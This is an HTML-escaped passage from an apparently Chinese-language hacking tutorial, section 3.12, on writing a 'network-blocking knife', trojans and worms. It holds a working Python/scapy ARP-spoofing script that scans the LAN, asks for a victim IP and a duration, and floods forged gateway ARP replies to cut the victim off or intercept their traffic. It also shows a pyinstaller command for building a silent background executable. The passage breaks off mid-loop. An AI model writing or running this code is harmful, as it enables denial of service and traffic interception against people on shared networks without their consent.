&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pyinstaller &lt;span class=&#34;token parameter variable&#34;&gt;-F&lt;/span&gt; server.py &lt;span class=&#34;token parameter variable&#34;&gt;-w&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# -w 为后台静默运行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;312-实战自编阻网小军刀-木马-蠕虫&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#312-实战自编阻网小军刀-木马-蠕虫&#34;&gt;#&lt;/a&gt; 3.12 实战自编阻网小军刀、木马、蠕虫&lt;/h1&gt;
&lt;h2 id=&#34;涉及技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#涉及技术&#34;&gt;#&lt;/a&gt; 涉及技术&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;网络技术&lt;/li&gt;
&lt;li&gt;内网渗透&lt;/li&gt;
&lt;li&gt;数据包和头部定义&lt;/li&gt;
&lt;li&gt;实用编程语言 python&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编写-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-2&#34;&gt;#&lt;/a&gt; 编写&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;since        : 2022-08-26 10:20:00&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastAuthor   : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lastTime     : 2022-08-26 10:41:31&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;blog         : http://dpm12345.cn/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;email        : 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 攻击指定 ip 实现断网 - ARP&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 原理：通过扫描当前攻击机的 IP 地址，得到内网的所有 ip 所在网关&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 组成 ARP 数据包，对网关内的主机先发起 Ping，有发现主机存活&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 获得存活 ip 列表，选择需要攻击 ip，发起攻击&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 步骤&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 1. 获得当前的 ip 及网关  route print&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 2. 封装 ARP 数据包，以太网的包结构形式来发起 ping，得到存活主机列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 3. 得到存活主机列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 4. 选择需要攻击或阻网的 ip&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 5.ARP 攻击 (封包 / 发包)---》代理，抓包&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 6. 设置攻击时长&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# pip install scapy&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; scapy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;scan2spoof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    netcard &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Intel(R) Wi-Fi 6 AX201 160MHz&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 攻击的网卡 (网卡名字，在上面命令得到的接口列表里)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmdcode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;route print&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 执行 cmd 命令获得当前主机 ip 和网关&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmdcode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 通过 line 获得 IPv4 和网关&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            ip_list &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            wg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ip_list&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 网关&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ip_list&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# ip&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;# print(wg,ip)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;使用的网卡是：{}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;netcard&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;本机的上网IP是：{}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;本机的上网网关：{}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;wg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 封装一个 ARP 的数据包，符合以太网的包定义&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    arppk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Ether&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ff:ff:ff:ff:ff:ff&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;ARP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pdst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;wg&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/24&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 将包抛出去&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ansip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; unansip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; srp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arppk&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; iface&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;netcard&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; verbose&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;扫描到{}台在线主机&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ansip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;扫描到{}台不在线主机&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;unansip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ansresip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; r &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ansip&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ansresip&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;psrc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hwsrc&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# ip,mac&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ansresip&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sort&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 去重排序&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mac &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ansresip&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;--------&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mac&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 代理 / 抓包&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 阻断网络&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    vip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入需要攻击的IP：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ttl &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入需要攻击的时间(秒)：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 以下实现 arp 攻击即可&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ttl&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        sendp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ether&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ff:ff:ff:ff:ff:ff&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;ARP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pdst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;vip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; psrc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;wg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; verbose&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        sendp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ether&lt;span class=&#34;token 